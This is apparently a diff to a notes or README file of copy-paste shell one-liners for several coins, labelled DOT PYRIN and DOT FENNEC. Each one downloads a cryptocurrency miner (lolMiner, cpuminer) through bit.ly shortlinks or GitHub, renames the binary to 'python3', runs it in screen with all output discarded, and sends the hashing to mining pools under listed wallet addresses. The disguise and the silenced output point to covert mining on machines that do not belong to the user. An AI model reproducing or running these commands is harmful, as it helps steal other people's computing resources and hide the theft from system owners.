@@ -8,10 +8,9 @@ apt install screen -y && wget https://bit.ly/kontolrum && tar -xvf kontolrum && 
 ===========================================================================
 # DOT PYRIN
 ```
-apt install srceen -y && wget bit.ly/dotgpulol && tar -xf dotgpulol && rm dotgpulol && cd 1.84 && mv lolMiner python3 && mv python3* ~/ && cd .. && rm -rvf 1.84 && cd ~/ && screen ./python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1
+apt install screen -y && wget bit.ly/dotgpulol && tar -xf dotgpulol && rm dotgpulol && cd 1.84 && mv lolMiner python3 && mv python3* ~/ && cd .. && rm -rvf 1.84 && cd ~/ && screen ./python3 -a PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB,mc=HTN > /dev/null 2>&1
 ```
 ===========================================================================
 # DOT FENNEC
 ```
-apt install screen -y && wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar -xf Cpuminer-opt-cpu-pool-linux64.tar.gz && rm Cpuminer-opt-cpu-pool-linux64.tar.gz && mv cpuminer python3 && mv python3* ~/ && rm -r ./* && cd ~/ && screen ./python3 -a yescryptr16 -o yescryptR16.asia.mine.zergpool.com:6333 -u FaVNktSU4RWiM5oU1PbThRaW85TG2P8ZZc -p c=FNNC,mc=FNNC,m=solo,ID=DOT
-```
+apt install screen -y && wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar -xf Cpuminer-opt-cpu-pool-linux64.tar.gz && rm Cpuminer-opt-cpu-pool-linux64.tar.gz && mv cpuminer python3 && mv python3* ~/ && rm -r ./* && cd ~/ && screen ./python3 -a cpupower -o cpupower.sea.mine.zpool.ca:6240 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,zap=CPU
